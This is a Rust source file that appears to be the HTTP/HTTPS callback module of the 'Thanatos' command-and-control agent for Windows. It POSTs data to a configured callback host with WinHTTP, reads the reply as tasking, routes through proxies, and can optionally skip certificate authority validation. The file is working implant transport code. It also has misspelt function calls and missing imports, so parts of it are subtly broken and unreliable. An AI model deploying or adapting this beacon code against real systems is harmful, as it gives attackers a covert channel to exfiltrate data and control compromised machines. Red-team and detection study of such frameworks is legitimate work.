use std::{ffi::OsString, os::windows::ffi::OsStrExt};

use crate::http::HttpProfile;
use agent_utils::{
    debug_invoke,
    errors::{ProfileInternalError, ThanatosError},
};
use windows::{
    core::PCWSTR,
    w,
    Win32::Networking::WinHttp::{
        WinHttpAddRequestHeaders, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
        WinHttpQueryDataAvailable, WinHttpQueryHeaders, WinHttpReadData, WinHttpReceiveResponse,
        WinHttpSendRequest, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_ADDREQ_FLAG_ADD,
        WINHTTP_ADDREQ_FLAG_REPLACE, WINHTTP_FLAG_SECURE, WINHTTP_OPEN_REQUEST_FLAGS,
        WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
    },
};

#[cfg(debug_assertions)]
use windows::Win32::Foundation::GetLastError;

#[cfg(debug_assertions)]
use agent_utils::log;

const WINHTTP_NO_PROXY_NAME: *const u16 = std::ptr::null();
const WINHTTP_NO_PROXY_BYPASS: *const u16 = std::ptr::null();
const WINHTTP_NO_REFERER: *const u16 = std::ptr::null();
const WINHTTP_DEFAULT_ACCEPT_TYPES: *mut u16 = std::ptr::null_mut();
const WINHTTP_HEADER_NAME_BY_INDEX: *mut u16 = std::ptr::null_mut();
const WINHTTP_NO_HEADER_INDEX: *mut u32 = std::ptr::null_mut();

mod winraii {
    use std::{
        ffi::c_void,
        ops::{Deref, DerefMut},
    };

    use agent_utils::errors::ThanatosError;
    use windows::Win32::{Foundation::HANDLE, Networking::WinHttp::WinHttpCloseHandle};

    pub struct WinHttpHandle(isize);

    impl Drop for WinHttpHandle {
        fn drop(&mut self) {
            unsafe {
                WinHttpCloseHandle(self.0 as *mut c_void);
            }
        }
    }

    impl TryFrom<*mut c_void> for WinHttpHandle {
        type Error = ThanatosError;

        fn try_from(value: *mut c_void) -> Result<Self, Self::Error> {
            if value.is_null() || HANDLE(value as isize).is_invalid() {
                return Err(ThanatosError::InvalidHandle);
            }

            Ok(Self(value as isize))
        }
    }

    impl Deref for WinHttpHandle {
        type Target = isize;
        fn deref(&self) -> &Self::Target {
            &self.0
        }
    }

    impl DerefMut for WinHttpHandle {
        fn deref_mut(&mut self) -> &mut Self::Target {
            &mut self.0
        }
    }
}

impl HttpProfile {
    pub fn send_http(&mut self, data: &str) -> Result<String, ThanatosError> {
        let user_agent = OsString::from(
            self.headers
                .get("User-Agent")
                .map(|v| v.to_owned())
                .unwrap_or_else(|| " "),
        );

        let user_agent: Vec<u16> = user_agent.encode_wide().chain([0]).collect();

        let internet_open_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpOpen(
                    PCWSTR(user_agent.as_ptr()),
                    WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                    PCWSTR(WINHTTP_NO_PROXY_NAME),
                    PCWSTR(WINHTTP_NO_PROXY_BYPASS),
                    0,
                )
            }),
            ThanatosError::os_error(),
            {
                log!("GetLastError(): {:?}", unsafe { GetLastError() });
            }
        );

        #[cfg(feature = "proxy")]
        {
            use windows::Win32::Networking::WinHttp::{
                WinHttpSetOption, WINHTTP_ACCESS_TYPE_NAMED_PROXY, WINHTTP_OPTION_PROXY,
                WINHTTP_PROXY_INFO,
            };
            let mut proxy_url: Vec<u16>;
            let mut local: Vec<u16> = OsString::from("<local>").encode_wide().chain([0]).collect();

            let proxy_url_str = OsString::from(
                if config::get_proxy_host().starts_with("http")
                    && config::get_proxy_hosr().contains(":")
                {
                    config::get_proxy_host().to_string()
                } else if config::get_proxy_host().starts_with("http") {
                    format!("{}:{}", config::get_proxy_host(), config::get_proxy_port()).to_string()
                } else {
                    if config::get_proxy_port() == 443 {
                        format!(
                            "https://{}:{}",
                            config::get_proxy_host(),
                            config::get_proxy_port()
                        )
                        .to_string()
                    } else {
                        format!("http://{}:{}", config::get_proxy_host(), 80).to_string()
                    }
                },
            );

            proxy_url = proxy_url_str.encode_wide().chain([0]).collect();

            let proxy_info = WINHTTP_PROXY_INFO {
                dwAccessType: WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                lpszProxy: PWSTR(proxy_url.as_mut_ptr()),
                lpszProxyBypass: PWSTR(local.as_mut_ptr()),
            };

            let proxy_info = unsafe {
                std::slice::from_raw_parts(
                    std::ptr::addr_of!(proxy_info) as _,
                    std::mem::size_of_val(&proxy_info),
                )
            };

            debug_invoke!(
                unsafe {
                    WinHttpSetOption(
                        Some(*internet_open_handle as _),
                        WINHTTP_OPTION_PROXY,
                        Some(proxy_info),
                    )
                }
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal)
            );
        }

        let server_name = OsString::from(debug_invoke!(self
            .host
            .split('/')
            .last()
            .ok_or(ThanatosError::MalformedCallbackHost)));
        let server_name: Vec<u16> = server_name.encode_wide().chain([0]).collect();

        let internet_connect_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpConnect(
                    *internet_open_handle as _,
                    PCWSTR(server_name.as_ptr()),
                    self.port as u16,
                    0,
                )
            }),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        let post_path = OsString::from(config::http::get_post_uri());
        let post_path: Vec<u16> = post_path.encode_wide().chain([0]).collect();

        let open_request_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpOpenRequest(
                    *internet_connect_handle as _,
                    PCWSTR(w!("POST\0").as_ptr()),
                    PCWSTR(post_path.as_ptr()),
                    PCWSTR(std::ptr::null()),
                    PCWSTR(WINHTTP_NO_REFERER),
                    (&PCWSTR(WINHTTP_DEFAULT_ACCEPT_TYPES)) as *const PCWSTR,
                    WINHTTP_OPEN_REQUEST_FLAGS(0),
                )
            }),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        for (&key, val) in self.headers.iter() {
            if key == "User-Agent" {
                continue;
            }

            let header_string = OsString::from(format!("{key}: {val}"));
            let header_string: Vec<u16> = header_string.encode_wide().chain([0]).collect();

            debug_invoke!(
                unsafe {
                    WinHttpAddRequestHeaders(
                        *open_request_handle as _,
                        &header_string,
                        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE,
                    )
                }
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );
        }

        debug_invoke!(
            unsafe {
                WinHttpSendRequest(
                    *open_request_handle as _,
                    None,
                    Some(data.as_ptr().cast()),
                    data.len() as u32,
                    data.len() as u32,
                    0,
                )
            }
            .ok(),
            ThanatosError::os_error(),
            {
                log!("Error: {:?}", unsafe { GetLastError() });
            }
        );

        debug_invoke!(
            unsafe { WinHttpReceiveResponse(*open_request_handle as _, std::ptr::null_mut()) }.ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        let mut status_code = 0u32;
        let mut status_buffer_size = std::mem::size_of_val(&status_code) as u32;

        debug_invoke!(
            unsafe {
                WinHttpQueryHeaders(
                    *open_request_handle as _,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    PCWSTR(WINHTTP_HEADER_NAME_BY_INDEX),
                    Some(std::mem::transmute(&mut status_code)),
                    &mut status_buffer_size,
                    WINHTTP_NO_HEADER_INDEX,
                )
            }
            .ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        if status_code != 200 {
            return Err(ThanatosError::ProfileError(
                ProfileInternalError::NoConnection,
            ));
        }

        let mut data_size = 0u32;
        let mut data_buffers: Vec<Vec<u8>> = Vec::new();

        debug_invoke!(
            unsafe { WinHttpQueryDataAvailable(*open_request_handle as _, &mut data_size) }.ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        while data_size > 0 {
            let mut data_buffer = vec![0u8; data_size as usize];

            debug_invoke!(
                unsafe {
                    WinHttpReadData(
                        *open_request_handle as _,
                        data_buffer.as_mut_ptr().cast(),
                        data_size,
                        &mut data_size,
                    )
                }
                .ok(),
                ThanatosError::os_error(),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );

            data_buffers.push(data_buffer);

            debug_invoke!(
                unsafe { WinHttpQueryDataAvailable(*open_request_handle as _, &mut data_size) }
                    .ok(),
                ThanatosError::os_error(),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );
        }

        let data = data_buffers.into_iter().flatten().collect::<Vec<u8>>();

        std::str::from_utf8(&data)
            .map_err(|_| ThanatosError::StringParseError)
            .map(|s| s.to_string())
    }

    pub fn send_https(&mut self, data: &str) -> Result<String, ThanatosError> {
        let user_agent = OsString::from(
            self.headers
                .get("User-Agent")
                .map(|v| v.to_owned())
                .unwrap_or_else(|| " "),
        );

        let user_agent: Vec<u16> = user_agent.encode_wide().chain([0]).collect();

        let internet_open_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpOpen(
                    PCWSTR(user_agent.as_ptr()),
                    WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                    PCWSTR(WINHTTP_NO_PROXY_NAME),
                    PCWSTR(WINHTTP_NO_PROXY_BYPASS),
                    0,
                )
            }),
            ThanatosError::os_error(),
            {
                log!("GetLastError(): {:?}", unsafe { GetLastError() });
            }
        );

        #[cfg(feature = "proxy")]
        {
            use windows::Win32::Networking::WinHttp::{
                WINHTTP_ACCESS_TYPE_NAMED_PROXY, WINHTTP_OPTION_PROXY, WINHTTP_PROXY_INFO,
            };
            let mut proxy_url: Vec<u16>;
            let mut local: Vec<u16> = OsString::from("<local>").encode_wide().chain([0]).collect();

            let proxy_url_str = OsString::from(
                if config::get_proxy_host().starts_with("http")
                    && config::get_proxy_host().contains(":")
                {
                    config::get_proxy_host().to_string()
                } else if config::get_proxy_host().starts_with("http") {
                    format!("{}:{}", config::get_proxy_host(), config::get_proxY_port()).to_string()
                } else {
                    if config::get_proxy_port() == 443 {
                        format!(
                            "https://{}:{}",
                            config::get_proxy_host(),
                            config::get_proxy_port()
                        )
                        .to_string()
                    } else {
                        format!("http://{}:{}", config::get_proxy_host(), 80).to_string()
                    }
                },
            );

            proxy_url = proxy_url_str.encode_wide().chain([0]).collect();

            let proxy_info = WINHTTP_PROXY_INFO {
                dwAccessType: WINHTTP_ACCESS_TYPE_NAMED_PROXY,
                lpszProxy: PWSTR(proxy_url.as_mut_ptr()),
                lpszProxyBypass: PWSTR(local.as_mut_ptr()),
            };

            let proxy_info = unsafe {
                std::slice::from_raw_parts(
                    std::ptr::addr_of!(proxy_info) as _,
                    std::mem::size_of_val(&proxy_info),
                )
            };

            debug_invoke!(
                unsafe {
                    WinHttpSetOption(
                        Some(*internet_open_handle as _),
                        WINHTTP_OPTION_PROXY,
                        Some(proxy_info),
                    )
                }
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal)
            );
        }

        let server_name = OsString::from(self.host.trim_start_matches("https://"));
        let server_name: Vec<u16> = server_name.encode_wide().chain([0]).collect();

        let internet_connect_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpConnect(
                    *internet_open_handle as _,
                    PCWSTR(server_name.as_ptr()),
                    self.port as u16,
                    0,
                )
            }),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        let post_path = OsString::from(config::http::get_post_uri());
        let post_path: Vec<u16> = post_path.encode_wide().chain([0]).collect();

        let open_request_handle = debug_invoke!(
            winraii::WinHttpHandle::try_from(unsafe {
                WinHttpOpenRequest(
                    *internet_connect_handle as _,
                    PCWSTR(w!("POST\0").as_ptr()),
                    PCWSTR(post_path.as_ptr()),
                    PCWSTR(std::ptr::null()),
                    PCWSTR(WINHTTP_NO_REFERER),
                    (&PCWSTR(WINHTTP_DEFAULT_ACCEPT_TYPES)) as *const PCWSTR,
                    WINHTTP_FLAG_SECURE,
                )
            }),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        // Please be smart and NOT use self signed certs!
        #[cfg(feature = "self-signed-certs")]
        unsafe {
            use windows::Win32::Networking::WinHttp::{
                WinHttpQueryOption, WINHTTP_OPTION_SECURITY_FLAGS,
            };

            let mut security_flags = 0u32;
            let mut security_flags_size = std::mem::size_of_val(&security_flags) as u32;

            debug_invoke!(
                WinHttpQueryOption(
                    *open_request_handle as _,
                    WINHTTP_OPTION_SECURITY_FLAGS,
                    Some(std::mem::transmute(&mut security_flags)),
                    &mut security_flags_size
                )
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal),
                { log!("{:?}", GetLastError()) }
            );

            security_flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;

            let security_flags = security_flags.to_le_bytes();

            debug_invoke!(
                WinHttpSetOption(
                    Some(*open_request_handle as _),
                    WINHTTP_OPTION_SECURITY_FLAGS,
                    Some(&security_flags),
                )
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal),
                { log!("{:?}", GetLastError()) }
            )
        };

        for (key, val) in self.headers.iter() {
            if key == &"User-Agent" {
                continue;
            }

            let header_string = OsString::from(format!("{key}: {val}"));
            let header_string: Vec<u16> = header_string.encode_wide().chain([0]).collect();

            debug_invoke!(
                unsafe {
                    WinHttpAddRequestHeaders(
                        *open_request_handle as _,
                        &header_string,
                        WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE,
                    )
                }
                .ok(),
                ThanatosError::ProfileError(ProfileInternalError::Fatal),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );
        }

        debug_invoke!(
            unsafe {
                WinHttpSendRequest(
                    *open_request_handle as _,
                    None,
                    Some(data.as_ptr().cast()),
                    data.len() as u32,
                    data.len() as u32,
                    0,
                )
            }
            .ok(),
            ThanatosError::os_error(),
            {
                log!("Error: {:?}", unsafe { GetLastError() });
            }
        );

        debug_invoke!(
            unsafe { WinHttpReceiveResponse(*open_request_handle as _, std::ptr::null_mut()) }.ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        let mut status_code = 0u32;
        let mut status_buffer_size = std::mem::size_of_val(&status_code) as u32;

        debug_invoke!(
            unsafe {
                WinHttpQueryHeaders(
                    *open_request_handle as _,
                    WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                    PCWSTR(WINHTTP_HEADER_NAME_BY_INDEX),
                    Some(std::mem::transmute(&mut status_code)),
                    &mut status_buffer_size,
                    WINHTTP_NO_HEADER_INDEX,
                )
            }
            .ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        if status_code != 200 {
            return Err(ThanatosError::ProfileError(
                ProfileInternalError::NoConnection,
            ));
        }

        let mut data_size = 0u32;
        let mut data_buffers: Vec<Vec<u8>> = Vec::new();

        debug_invoke!(
            unsafe { WinHttpQueryDataAvailable(*open_request_handle as _, &mut data_size) }.ok(),
            ThanatosError::os_error(),
            {
                log!("{:?}", unsafe { GetLastError() });
            }
        );

        while data_size > 0 {
            let mut data_buffer = vec![0u8; data_size as usize];

            debug_invoke!(
                unsafe {
                    WinHttpReadData(
                        *open_request_handle as _,
                        data_buffer.as_mut_ptr().cast(),
                        data_size,
                        &mut data_size,
                    )
                }
                .ok(),
                ThanatosError::os_error(),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );

            data_buffers.push(data_buffer);

            debug_invoke!(
                unsafe { WinHttpQueryDataAvailable(*open_request_handle as _, &mut data_size) }
                    .ok(),
                ThanatosError::os_error(),
                {
                    log!("{:?}", unsafe { GetLastError() });
                }
            );
        }

        let data = data_buffers.into_iter().flatten().collect::<Vec<u8>>();

        std::str::from_utf8(&data)
            .map_err(|_| ThanatosError::StringParseError)
            .map(|s| s.to_string())
    }
}
